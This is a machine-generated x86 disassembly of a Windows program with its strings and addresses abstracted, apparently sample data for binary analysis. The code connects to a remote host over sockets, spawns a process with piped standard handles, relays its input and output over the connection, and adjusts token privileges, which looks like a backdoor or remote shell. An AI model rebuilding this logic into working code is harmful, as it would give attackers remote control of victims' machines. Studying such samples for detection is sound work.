mov esi eax
push edi
mov [ esi ] bl
call sub_402a10
add esp 0xc
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_406e9e
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0x0
push 0x1
pop esi
push esi
push 0x2
call [ Ordinal_WSOCK32_23@IAT ]
mov edi [ ebp + 0x8 ]
cmp eax 0xffffffff
mov [ edi ] eax
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push ecx
push 0x8004667e
push eax
call [ Ordinal_WSOCK32_12@IAT ]
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
push 0x10
and [ ebx + 0x4 ] 0x0
mov [ ebx ] 0x3c
and [ esi ] 0x0
mov eax [ edi ]
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0xc ]
inc [ esi ]
push eax
mov [ eax ] 0x2
push [ edi ]
call [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi ]
push ebx
push 0x0
push esi
inc eax
push 0x0
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jg r-xdata
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
push 0x1
pop eax
push [ edi ]
call [ Ordinal_WSOCK32_3@IAT ]
sub_406f37
push ebp
mov ebp esp
sub esp 0x80
push [ ebp + 0xc ]
lea eax [ ebp - 0x80 ]
push [ ebp + 0x8 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x80 ]
push eax
call strlen
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_402833
add esp 0x1c
test eax eax
je r-xdata
xor eax eax
leave
retn
push [ rw-data ]
call sub_407125
cmp eax 0xffffffff
pop ecx
je r-xdata
cmp eax 0x3e800
jge r-xdata
push 0x1
pop eax
leave
retn
sub_406f90
push ebp
mov ebp esp
sub esp 0x11c
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
leave
retn
mov ax [ rw-data ]
push eax
call [ Ordinal_WSOCK32_9@IAT ]
push rw-data
mov [ ebp - 0xe ] ax
call [ Ordinal_WSOCK32_10@IAT ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x11c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_406e9e
add esp 0x10
test eax eax
jne r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
call sub_406f37
pop ecx
mov esi eax
pop ecx
push [ rw-data ]
call [ Ordinal_WSOCK32_3@IAT ]
mov eax esi
pop esi
leave
retn
sub_407013
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi [ _itoa@IAT ]
lea eax [ ebp - 0xf ]
push 0xa
push eax
push [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3a
call edi
add esp 0xc
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
push [ ebp + 0x14 ]
push esi
call strcat
cmp [ ebp + 0x18 ] 0x1
pop ecx
pop ecx
jne r-xdata
push rw-data
push esi
call strcat
push [ ebp + 0xc ]
push esi
call strcat
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
add esp 0x18
mov esi [ ebp + 0x8 ]
push esi
call strcpy
cmp [ rw-data ] 0x0
pop ecx
pop ecx
je r-xdata
push rw-data
push esi
call strcat
cmp [ ebp + 0x20 ] 0x0
pop ecx
pop ecx
je r-xdata
push rw-data
push esi
call strcat
pop ecx
pop ecx
push rw-data
push rw-data
jmp r-xdata
push rw-data
push esi
call strcat
pop ecx
pop ecx
pop edi
pop esi
leave
retn
push rw-data
push esi
call strcat
lea eax [ ebp - 0x10 ]
push 0xa
push eax
push [ ebp + 0x1c ]
call edi
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
push rw-data
push esi
call strcat
add esp 0x24
push esi
call strcat
pop ecx
pop ecx
push [ ebp + 0xc ]
push esi
call strcat
lea eax [ ebp - 0x10 ]
push eax
push esi
call strcat
push rw-data
push esi
call strcat
add esp 0x18
cmp [ ebp + 0x18 ] 0x1
jne r-xdata
sub_407125
push ebp
mov ebp esp
mov eax 0x2008
call sub_407dc0
push ebx
push esi
xor ebx ebx
push edi
mov edi [ Sleep@IAT ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
lea esi [ ebp - 0x2008 ]
or eax 0xffffffff
cmp eax 0xffffffff
jne r-xdata
mov al [ esi ]
cmp al 0xd
je r-xdata
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
inc [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x4
jge r-xdata
cmp al 0xa
je r-xdata
push 0x1
call edi
mov eax [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
cmp eax 0x1388
jg r-xdata
and [ ebp + ebx - 0x2007 ] 0x0
lea eax [ ebp - 0x2008 ]
push rw-data
push eax
call [ strstr@IAT ]
neg eax
sbb eax eax
pop ecx
and eax 0x2
pop ecx
dec eax
jmp r-xdata
inc ebx
inc esi
cmp ebx 0x2000
ja r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
call edi
jmp r-xdata
push 0x0
push 0x1
push esi
push [ ebp + 0x8 ]
call [ Ordinal_WSOCK32_16@IAT ]
test eax eax
je r-xdata
sub_4071d7
push ebp
mov ebp esp
mov eax 0x2140
call sub_407dc0
push ebx
push esi
push edi
xor ebx ebx
push [ ebp + 0x8 ]
call sub_402a10
mov esi [ Ordinal_WSOCK32_9@IAT ]
mov edi [ Ordinal_WSOCK32_10@IAT ]
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push eax
lea eax [ ebp - 0x3c ]
push eax
call strcpy
pop ecx
pop ecx
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x1a ] ax
lea eax [ ebp - 0x3c ]
push eax
call edi
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x140 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_406e9e
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
mov ax [ rw-data ]
push eax
call esi
push rw-data
mov [ ebp - 0x1a ] ax
call edi
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x140 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x4 ]
push eax
call sub_406e9e
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp + 0x24 ] 0x1
jne r-xdata
push 0x1
pop ebx
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x24 ]
push 0x1
push [ ebp + 0x18 ]
push 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x2140 ]
push edi
push eax
push [ ebp - 0x4 ]
call [ rw-data ]
push 0x1
pop esi
cmp [ ebp + 0x24 ] esi
jne r-xdata
test ebx ebx
je r-xdata
push [ ebp + 0x10 ]
lea eax [ ebp - 0x2140 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_407013
add esp 0x1c
lea eax [ ebp - 0x2140 ]
push eax
call strlen
push [ ebp + 0x18 ]
mov edi eax
mov esi edi
push [ ebp + 0x14 ]
lea eax [ ebp + edi - 0x2140 ]
push eax
call memcpy
add edi [ ebp + 0x18 ]
add esp 0x10
cmp [ ebp + 0x24 ] 0x1
jne r-xdata
push [ ebp - 0x4 ]
call sub_407125
cmp eax 0xffffffff
pop ecx
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x140 ]
push 0x0
push eax
mov eax [ ebp - 0x4 ]
push 0x0
inc eax
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
lea ebx [ edi - 0xc ]
mov eax 0x1ff9
cmp ebx eax
jbe r-xdata
push [ ebp - 0x4 ]
call [ Ordinal_WSOCK32_3@IAT ]
mov edi 0x3e800
cmp eax edi
jge r-xdata
xor esi esi
jmp r-xdata
add esi 0x5
cmp esi ebx
jge r-xdata
mov ebx eax
xor ebx ebx
xor esi esi
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x4 ]
call [ Ordinal_WSOCK32_3@IAT ]
mov eax esi
jmp r-xdata
lea eax [ ebp + esi - 0x2140 ]
mov [ ebp + 0x18 ] eax
mov eax edi
push ebx
sub eax esi
push eax
mov eax [ ebp + 0x1c ]
add eax esi
push eax
push [ ebp - 0x4 ]
call [ Ordinal_WSOCK32_16@IAT ]
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jge r-xdata
inc esi
inc [ ebp + 0x18 ]
cmp esi ebx
jl r-xdata
cmp eax ebx
je r-xdata
mov [ ebp + esi - 0x213b ] 0x2a
push 0x7
push rw-data
push [ ebp + 0x18 ]
call memcmp
add esp 0xc
test eax eax
je r-xdata
push [ ebp - 0x4 ]
call [ Ordinal_WSOCK32_3@IAT ]
mov eax [ ebp + 0x20 ]
push 0x1
mov [ eax ] esi
pop eax
jmp r-xdata
add esi eax
cmp esi edi
jl r-xdata
lea eax [ ebp - 0xc ]
push eax
push ebx
lea eax [ ebp - 0x140 ]
push ebx
push eax
mov eax [ ebp - 0x4 ]
inc eax
push eax
call [ Ordinal_WSOCK32_18@IAT ]
test eax eax
jle r-xdata
sub_4073fc
push ebp
mov ebp esp
sub esp 0x58c
push 0x3e800
call [ malloc@IAT ]
test eax eax
pop ecx
mov [ ebp - 0x8 ] eax
jne r-xdata
push ebx
push esi
mov esi rw-data
push edi
lea eax [ ebp - 0x587 ]
push esi
push eax
call strcpy
push esi
call strlen
mov ebx eax
mov esi rw-data
add ebx 0x6
push esi
lea eax [ ebp + ebx - 0x58c ]
push eax
call strcpy
push esi
call strlen
lea ebx [ ebx + eax + 0x1 ]
mov esi 0x9c
push esi
push rw-data
lea eax [ ebp + ebx - 0x58c ]
push eax
call memcpy
mov ax [ rw-data ]
add ebx esi
mov edx [ rw-data ]
mov esi rw-data
lea edi [ ebp - 0x18c ]
add esp 0x24
movsd [ edi ] [ esi ]
mov [ ebp + ebx - 0x58c ] ax
inc ebx
movsd [ edi ] [ esi ]
inc ebx
push 0x1d
test edx edx
setne al
movsw [ edi ] [ esi ]
mov [ ebp + ebx - 0x58c ] al
mov eax [ rw-data ]
inc ebx
pop ecx
movsb [ edi ] [ esi ]
mov [ ebp + ebx - 0x58c ] eax
xor eax eax
lea edi [ ebp - 0x181 ]
mov esi [ sprintf@IAT ]
[ edi ]
stosb [ edi ]
xor eax eax
add ebx 0x4
cmp edx eax
je r-xdata
leave
retn
lea eax [ ebp - 0x18c ]
push eax
push rw-data
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x10c ]
push eax
lea eax [ ebp + ebx - 0x58c ]
push eax
call strcpy
lea eax [ ebp - 0x10c ]
push eax
call strlen
add esp 0x1c
lea ebx [ ebx + eax + 0x1 ]
call [ GetTickCount@IAT ]
mov ecx 0x36ee80
xor edx edx
mov edi ecx
mov [ ebp - 0x4 ] eax
div edi
mov edi 0xea60
mov eax edx
xor edx edx
div edi
xor edx edx
push eax
mov eax [ ebp - 0x4 ]
div ecx
push eax
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x10c ]
push eax
lea eax [ ebp + ebx - 0x58c ]
push eax
call strcpy
lea eax [ ebp - 0x10c ]
push eax
call strlen
lea esi [ ebx + eax + 0x1 ]
lea eax [ ebp - 0x10c ]
push rw-data
push eax
call strcpy
lea eax [ ebp - 0x10c ]
push 0x2f
push eax
call [ strrchr@IAT ]
mov ebx rw-data
lea edi [ ebp + esi - 0x58c ]
push ebx
push edi
mov [ ebp - 0x4 ] eax
call strcpy
mov eax [ ebp - 0x4 ]
add esp 0x34
test eax eax
je r-xdata
cmp [ rw-data ] eax
jne r-xdata
mov edi rw-data
lea eax [ ebp + esi - 0x58c ]
push edi
push eax
call strcpy
push edi
call strlen
add esp 0xc
lea ecx [ ebp - 0xc ]
lea eax [ esi + eax + 0x1 ]
mov [ ebp - 0x58c ] 0x30
push 0x1
push ecx
push [ ebp - 0x8 ]
mov [ ebp - 0x58b ] eax
push eax
lea eax [ ebp - 0x58c ]
push eax
push rw-data
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
call sub_4071d7
push [ ebp - 0x8 ]
mov esi eax
call [ free@IAT ]
add esp 0x24
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
and [ eax ] 0x0
lea eax [ ebp - 0x10c ]
push eax
push edi
call strcat
push ebx
call strlen
mov edi eax
lea eax [ ebp - 0x10c ]
push eax
call strlen
add esp 0x10
add eax esi
lea esi [ eax + edi + 0x1 ]
cmp [ rw-data ] eax
mov al 0x43
jne r-xdata
cmp [ rw-data ] eax
je r-xdata
push [ rw-data ]
movsx eax al
push rw-data
push eax
lea eax [ ebp - 0x18c ]
push rw-data
push eax
call esi
add esp 0x14
mov al 0x20
mov al 0x50
jmp r-xdata
sub_407688
push ebp
mov ebp esp
sub esp 0x120
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
mov esi [ Ordinal_WSOCK32_9@IAT ]
push edi
mov [ rw-data ] ebx
mov edi rw-data
jne r-xdata
mov ax [ rw-data ]
push eax
call esi
push rw-data
mov [ ebp - 0xe ] ax
call [ Ordinal_WSOCK32_10@IAT ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push edi
call sub_406e9e
add esp 0x10
test eax eax
je r-xdata
mov ax [ rw-data ]
push eax
call esi
mov [ ebp - 0xe ] ax
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x120 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push edi
call sub_406e9e
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov [ rw-data ] 0x1
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push ebx
push ebx
push sub_402eee
push ebx
push ebx
call [ CreateThread@IAT ]
cmp eax ebx
mov [ rw-data ] eax
jne r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ rw-data ] ebx
call sub_4031cf
test eax eax
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
push 0x1
pop eax
push [ rw-data ]
call [ Ordinal_WSOCK32_3@IAT ]
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
call sub_406f37
pop ecx
cmp eax ebx
pop ecx
mov [ rw-data ] eax
je r-xdata
sub_4077bf
push ebp
mov ebp esp
sub esp 0x200
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp [ edi ] 0x41
je r-xdata
push 0x200
lea eax [ ebp - 0x200 ]
push esi
push eax
call memset
add esp 0xc
push esi
push [ edi + 0x1 ]
push 0x1
push rw-data
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
lea eax [ ebp - 0x200 ]
push eax
call sub_407013
lea eax [ ebp - 0x200 ]
push eax
call strlen
push eax
lea eax [ ebp - 0x200 ]
push eax
call sub_402833
add esp 0x28
test eax eax
jne r-xdata
cmp [ rw-data ] esi
jne r-xdata
push [ ebp + 0xc ]
push edi
call sub_402833
pop ecx
pop ecx
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
je r-xdata
pop edi
pop esi
leave
retn
push [ rw-data ]
mov [ rw-data ] 0x1
mov [ rw-data ] esi
call [ Ordinal_WSOCK32_3@IAT ]
call sub_407688
test eax eax
je r-xdata
push 0x1
call [ rw-data ]
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
sub_40788d
mov eax sub_407fe8
call _EH_prolog
push ecx
mov eax 0x1544
call sub_407dc0
push ebx
push esi
push edi
xor edi edi
mov [ ebp - 0x10 ] esp
push rw-data
mov [ ebp - 0x4 ] edi
call [ LoadLibraryA@IAT ]
mov esi [ GetProcAddress@IAT ]
mov ebx eax
push rw-data
push ebx
call esi
push rw-data
push ebx
mov [ ebp - 0x34 ] eax
call esi
push 0x1
mov esi eax
pop ebx
lea eax [ ebp - 0x40 ]
or [ ebp - 0x1c ] 0xffffffff
push edi
push eax
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x18 ] edi
mov [ rw-data ] ebx
mov [ ebp - 0x40 ] 0xc
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x38 ] ebx
call esi
lea eax [ ebp - 0x40 ]
push edi
push eax
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call esi
push 0x44
lea eax [ ebp - 0x9c ]
push edi
push eax
call memset
mov eax [ ebp - 0x2c ]
add esp 0xc
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x60 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x70 ] 0x101
mov [ ebp - 0x48 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x9c ]
push eax
push edi
push edi
push edi
push ebx
push edi
lea eax [ ebp - 0x48 ]
push edi
push eax
push edi
mov [ ebp - 0x6c ] di
call [ CreateProcessA@IAT ]
push 0x3e8
call [ rw-data ]
lea eax [ ebp - 0x14 ]
push eax
call sub_407be7
pop ecx
cmp eax edi
mov [ ebp - 0x28 ] eax
je r-xdata
push edi
push [ ebp - 0x58 ]
call [ ebp - 0x34 ]
mov [ rw-data ] edi
mov eax ebx
jmp r-xdata
cmp eax ebx
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
push rw-data
push rw-data
jmp r-xdata
cmp [ ebp - 0x1c ] edi
jg r-xdata
lea eax [ ebp - 0x18 ]
push edi
push eax
lea eax [ ebp - 0x1554 ]
push [ ebp - 0x18 ]
push eax
push [ ebp - 0x20 ]
call [ ReadFile@IAT ]
cmp eax edi
je r-xdata
lea eax [ ebp - 0x19c ]
push eax
call strcpy
pop ecx
lea eax [ ebp - 0x19c ]
pop ecx
push edi
push eax
call strlen
pop ecx
add eax 0x4
push eax
push ebx
push rw-data
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
lea eax [ ebp - 0xd54 ]
push eax
call sub_407013
lea eax [ ebp - 0xd54 ]
push eax
call strlen
mov esi eax
lea eax [ ebp - 0x19c ]
push eax
call strlen
mov [ ebp + esi - 0xd54 ] eax
lea eax [ ebp - 0x19c ]
push eax
add esi 0x4
call strlen
push eax
lea eax [ ebp - 0x19c ]
push eax
lea eax [ ebp + esi - 0xd54 ]
push eax
call memcpy
lea eax [ ebp - 0x19c ]
push eax
call strlen
add esp 0x38
add esi eax
lea eax [ ebp - 0xd54 ]
push edi
push esi
push eax
push [ ebp - 0x14 ]
call [ rw-data ]
push 0x64
mov eax 0x7ff
cmp [ ebp - 0x1c ] eax
ja r-xdata
push [ ebp - 0x14 ]
call sub_407125
cmp eax edi
pop ecx
je r-xdata
push [ ebp - 0x14 ]
call [ Ordinal_WSOCK32_3@IAT ]
cmp [ ebp - 0x28 ] 0x3
jne r-xdata
push edi
push eax
lea eax [ ebp - 0x1554 ]
push eax
push [ ebp - 0x14 ]
call [ Ordinal_WSOCK32_16@IAT ]
cmp eax edi
jle r-xdata
mov eax [ ebp - 0x1c ]
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x18 ]
push edi
add eax 0x4
push eax
push ebx
push rw-data
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
lea eax [ ebp - 0xd54 ]
push eax
call sub_407013
lea eax [ ebp - 0xd54 ]
push eax
call strlen
mov esi eax
mov eax [ ebp - 0x18 ]
push eax
mov [ ebp + esi - 0xd54 ] eax
add esi 0x4
lea eax [ ebp - 0x1554 ]
push eax
lea eax [ ebp + esi - 0xd54 ]
push eax
call memcpy
add esp 0x2c
add esi [ ebp - 0x18 ]
push [ ebp - 0x14 ]
or [ ebp - 0x1c ] 0xffffffff
call [ Ordinal_WSOCK32_3@IAT ]
push 0x64
call [ rw-data ]
lea eax [ ebp - 0x14 ]
push eax
call sub_407be7
cmp eax edi
pop ecx
je r-xdata
sub [ ebp - 0x1c ] eax
lea ecx [ ebp - 0x18 ]
push edi
push ecx
push eax
lea eax [ ebp - 0x1554 ]
push eax
push [ ebp - 0x24 ]
call [ WriteFile@IAT ]
cmp eax edi
jne r-xdata
cmp eax 0x3e800
jge r-xdata
sub esi eax
cmp esi edi
jg r-xdata
push 0xa
jmp r-xdata
push [ ebp - 0x14 ]
call sub_40516a
cmp eax 0xffffffff
pop ecx
mov [ ebp - 0x1c ] eax
je r-xdata
push edi
lea eax [ ebp - 0xd54 ]
push esi
push eax
push [ ebp - 0x14 ]
call [ rw-data ]
cmp eax edi
jl r-xdata
call [ rw-data ]
push edi
lea eax [ ebp - 0x18 ]
push edi
push eax
lea eax [ ebp - 0x1554 ]
push 0x800
push eax
push [ ebp - 0x20 ]
call [ PeekNamedPipe@IAT ]
cmp [ ebp - 0x18 ] edi
je r-xdata
sub_407be7
push ebp
mov ebp esp
sub esp 0x9c
xor eax eax
cmp [ rw-data ] eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ rw-data ]
push ebx
push esi
push edi
mov edi [ Ordinal_WSOCK32_23@IAT ]
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
push eax
push 0x1
push 0x2
mov [ ebp - 0xc ] ecx
call edi
mov esi [ ebp + 0x8 ]
cmp eax 0xffffffff
mov [ esi ] eax
je r-xdata
cmp [ rw-data ] eax
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ Ordinal_WSOCK32_3@IAT ]
cmp [ rw-data ] eax
mov [ ebp - 0x4 ] 0x1
jne r-xdata
cmp [ rw-data ] eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0xc ]
mov [ ebp - 0x1c ] 0x2
call [ Ordinal_WSOCK32_9@IAT ]
mov [ ebp - 0x1a ] ax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x1c ]
push 0x10
push eax
push [ esi ]
call [ rw-data ]
test eax eax
jne r-xdata
push rw-data
call [ Ordinal_WSOCK32_10@IAT ]
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
push [ esi ]
call ebx
cmp [ ebp - 0x4 ] eax
je r-xdata
push 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] 0x2
je r-xdata
pop eax
push 0x3
jmp r-xdata
push [ rw-data ]
push [ rw-data ]
call [ Ordinal_WSOCK32_11@IAT ]
push eax
lea eax [ ebp - 0x9c ]
push rw-data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x9c ]
push eax
call strlen
add esp 0x14
mov [ ebp + 0x8 ] eax
sub [ ebp + 0x8 ] eax
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
push 0x0
lea eax [ ebp - 0x9c ]
push [ ebp + 0x8 ]
push eax
push [ esi ]
call [ rw-data ]
test eax eax
jl r-xdata
push [ esi ]
call sub_407125
cmp eax 0xffffffff
pop ecx
je r-xdata
push [ esi ]
call ebx
push 0x2
pop eax
push 0x0
push 0x1
push eax
mov [ ebp - 0x4 ] eax
call edi
cmp eax 0xffffffff
mov [ esi ] eax
jne r-xdata
cmp eax 0x3e800
jl r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
jmp r-xdata
push 0x2
sub_407dc0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_407f6f
cmp [ rw-data ] ebx
jne r-xdata
call sub_407f5a
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_407f6c
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_401080
mov eax r-xdata
retn
sub_40170d
sub esp 0x190
lea eax [ esp ]
push eax
push 0x2
call [ Ordinal_WSOCK32_115@IAT ]
neg eax
sbb eax eax
inc eax
add esp 0x190
retn
sub_4028eb
push rw-data
call sub_406c7c
test eax eax
pop ecx
jne r-xdata
push rw-data
push rw-data
call sub_406af7
pop ecx
pop ecx
retn
retn
sub_402940
push rw-data
push rw-data
call sub_406af7
pop ecx
pop ecx
retn
sub_402952
push rw-data
call sub_406a39
test eax eax
pop ecx
jne r-xdata
push rw-data
push rw-data
call sub_406af7
pop ecx
pop ecx
retn
retn
sub_402a10
push [ esp + 0x4 ]
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax + 0xc ]
mov eax [ eax ]
push [ eax ]
call [ Ordinal_WSOCK32_11@IAT ]
retn
sub_402e52
mov eax sub_402e58
retn
sub_402e58
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_402ed4
mov eax r-xdata
retn
sub_403094
mov eax sub_40309a
retn
sub_40309a
push 0x1
pop eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_4030fd
mov eax r-xdata
retn
sub_4033e7
xor eax eax
push eax
push eax
push eax
push [ esp + 0x14 ]
push eax
push [ esp + 0x18 ]
call [ AdjustTokenPrivileges@IAT ]
retn
sub_40392f
mov eax [ rw-data ]
push [ eax ]
call sub_4038f9
neg eax
sbb al al
pop ecx
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_403edc
sub_403985
mov eax [ rw-data ]
push [ eax ]
call sub_40394e
neg eax
sbb al al
pop ecx
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_403edc
sub_4039a4
push [ rw-data ]
call sub_405082
neg eax
sbb al al
pop ecx
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_403edc
sub_403b43
push 0x0
push [ rw-data ]
call [ CreateDirectoryA@IAT ]
neg eax
sbb al al
and al 0xa
add al 0x45
mov [ rw-data ] al
jmp sub_403edc
sub_404325
mov eax [ rw-data ]
lea ecx [ eax + 0x4 ]
push ecx
push [ eax ]
call sub_4041a1
pop ecx
pop ecx
retn
sub_404446
push 0x200
push [ rw-data ]
call [ rw-data ]
push rw-data
push [ rw-data ]
call strcat
push 0x4f
call sub_404338
add esp 0xc
retn
sub_405072
push rw-data
call sub_406063
pop ecx
jmp sub_406d38
sub_405856
mov eax r-xdata
retn
sub_405d2c
mov eax sub_405d32
retn
sub_405d32
mov ecx [ ebp - 0xc ]
push 0x1
pop eax
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_407bcd
mov eax sub_407bd3
retn
sub_407bd3
push 0x1
pop eax
